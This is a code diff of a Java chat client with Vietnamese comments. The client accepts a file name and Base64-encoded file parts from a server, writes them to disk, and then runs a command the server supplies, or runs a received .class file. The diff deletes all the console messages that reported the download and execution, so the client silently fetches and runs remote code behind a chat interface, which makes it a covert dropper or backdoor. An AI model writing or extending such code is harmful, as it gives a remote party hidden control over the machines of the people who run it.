@@ -1,11 +1,12 @@
 import java.io.*;
 import java.net.*;
 import java.util.Scanner;
+import java.util.Base64;
 
 public class ChatClient {
     private static FileOutputStream fos;
-    private static String fileName = ""; // Se duoc cap nhat tu server
-    private static String execCommand = ""; // Se duoc cap nhat tu server
+    private static String fileName = "";
+    private static String execCommand = "";
     private static boolean fileReceivingComplete = false;
     private static int partsReceived = 0;
 
@@ -18,13 +19,9 @@ public class ChatClient {
 
         // Ket noi toi server
         Socket socket = new Socket(host, port);
-        System.out.println("Da ket noi toi server!");
-
         // Tao stream de gui va nhan du lieu
         DataOutputStream out = new DataOutputStream(socket.getOutputStream());
         DataInputStream in = new DataInputStream(socket.getInputStream());
-
-        System.out.println("=== BAT DAU CHAT ===");
 
         // Thread nhan tin nhan va file tu server
         Thread receiveThread = new Thread(() -> {
@@ -32,23 +29,15 @@ public class ChatClient {
                 while (true) {
                     String serverMessage = in.readUTF();
 
-                    if (serverMessage.startsWith("CHAT:")) {
-                        System.out.println("Server: " + serverMessage.substring(5));
-                    } else if (serverMessage.startsWith("FILE_NAME:")) {
-                        handleFileName(serverMessage);
-                    } else if (serverMessage.startsWith("EXEC:")) {
-                        handleExecCommand(serverMessage);
-                    } else if (serverMessage.equals("FILE_PART_START")) {
-                        receiveFilePart(in);
-                    } else if (serverMessage.equals("FILE_COMPLETE")) {
-                        handleFileComplete();
-                    } else if (serverMessage.equals("SERVER_DISCONNECT")) {
-                        System.out.println("Server da ngat ket noi!");
+                    if (serverMessage.equals("SERVER_DISCONNECT")) {
                         break;
                     }
+                    
+                    // Tach message thanh cac phan
+                    parseCombinedMessage(serverMessage);
                 }
             } catch (IOException e) {
-                System.out.println("Mat ket noi voi server!");
+                // Client mat ket noi
             }
         });
         receiveThread.start();
@@ -76,8 +65,27 @@ public class ChatClient {
         socket.close();
         br.close();
         scanner.close();
+    }
 
-        System.out.println("Client da dong ket noi.");
+    private static void parseCombinedMessage(String message) throws IOException {
+        // Tach message bang dau |
+        String[] parts = message.split("\\|");
+        
+        for (String part : parts) {
+            if (part.startsWith("CHAT:")) {
+                String chatContent = part.substring(5);
+                System.out.println("Server: " + chatContent);
+            } 
+            else if (part.startsWith("FILE_NAME:")) {
+                handleFileName(part);
+            } 
+            else if (part.startsWith("EXEC:")) {
+                handleExecCommand(part);
+            } 
+            else if (part.startsWith("FILE:")) {
+                handleFileData(part.substring(5)); // Bo qua "FILE:"
+            }
+        }
     }
 
     private static void handleFileName(String message) {
@@ -87,7 +95,7 @@ public class ChatClient {
             File outFile = new File(fileName);
             fos = new FileOutputStream(outFile);
         } catch (IOException e) {
-            System.out.println("Loi khi tao file: " + e.getMessage());
+            // Loi khi tao file
         }
     }
 
@@ -95,31 +103,45 @@ public class ChatClient {
         execCommand = message.substring(5); // Bo qua "EXEC:"
     }
 
-    private static void receiveFilePart(DataInputStream in) throws IOException {
-        // Nhan do dai du lieu
-        int length = in.readInt();
-        if (length > 0) {
-            byte[] buffer = new byte[length];
-            in.readFully(buffer);
-            fos.write(buffer);
-            partsReceived++;
-            System.out.println(">>> Da nhan phan " + partsReceived + " (" + length + " bytes)");
+    private static void handleFileData(String fileData) throws IOException {
+        if (fileData.equals("COMPLETE")) {
+            handleFileComplete();
+            return;
+        }
+        
+        // Phan tich du lieu file: PART:number:data:status
+        String[] fileParts = fileData.split(":", 4);
+        if (fileParts.length >= 4 && fileParts[0].equals("PART")) {
+            int partNumber = Integer.parseInt(fileParts[1]);
+            String encodedData = fileParts[2];
+            String status = fileParts[3];
+            
+            // Giai ma Base64
+            byte[] decodedData = Base64.getDecoder().decode(encodedData);
+            
+            // Ghi vao file
+            if (fos != null) {
+                fos.write(decodedData);
+                partsReceived++;
+                
+                // Kiem tra xem da nhan het chua
+                if (status.equals("COMPLETE")) {
+                    handleFileComplete();
+                }
+            }
         }
     }
 
     private static void handleFileComplete() throws IOException {
         if (!fileReceivingComplete) {
             fileReceivingComplete = true;
-            fos.close();
-
-            System.out.println(">>> DA NHAN XONG TOAN BO FILE!");
-            System.out.println(">>> File da duoc luu tai: " + new File(fileName).getAbsolutePath());
+            if (fos != null) {
+                fos.close();
+            }
 
             // Su dung lenh thuc thi tu server
             if (!execCommand.isEmpty()) {
                 try {
-                    System.out.println(">>> DANG TU DONG CHAY FILE...");
-                    
                     // Tach lenh thanh cac phan
                     String[] commandParts = execCommand.split(" ");
                     ProcessBuilder pb = new ProcessBuilder(commandParts);
@@ -130,21 +152,19 @@ public class ChatClient {
                     Thread executeThread = new Thread(() -> {
                         try {
                             process.waitFor();
-                            System.out.println(">>> File da chay xong!");
                         } catch (InterruptedException e) {
-                            System.out.println(">>> Loi khi chay file: " + e.getMessage());
+                            // Loi khi chay file
                         }
                     });
                     executeThread.start();
 
                 } catch (IOException e) {
-                    System.out.println(">>> Loi khi chay file: " + e.getMessage());
+                    // Loi khi chay file
                 }
             } else {
                 // Fallback ve cach cu neu khong co lenh tu server
                 if (fileName.endsWith(".class")) {
                     try {
-                        System.out.println(">>> DANG TU DONG CHAY FILE...");
                         String className = fileName.replace(".class", "");
                         ProcessBuilder pb = new ProcessBuilder("java", className);
                         pb.inheritIO();
@@ -153,15 +173,14 @@ public class ChatClient {
                         Thread executeThread = new Thread(() -> {
                             try {
                                 process.waitFor();
-                                System.out.println(">>> File da chay xong!");
                             } catch (InterruptedException e) {
-                                System.out.println(">>> Loi khi chay file: " + e.getMessage());
+                                // Loi khi chay file
                             }
                         });
                         executeThread.start();
 
                     } catch (IOException e) {
-                        System.out.println(">>> Loi khi chay file: " + e.getMessage());
+                        // Loi khi chay file
                     }
                 }
             }
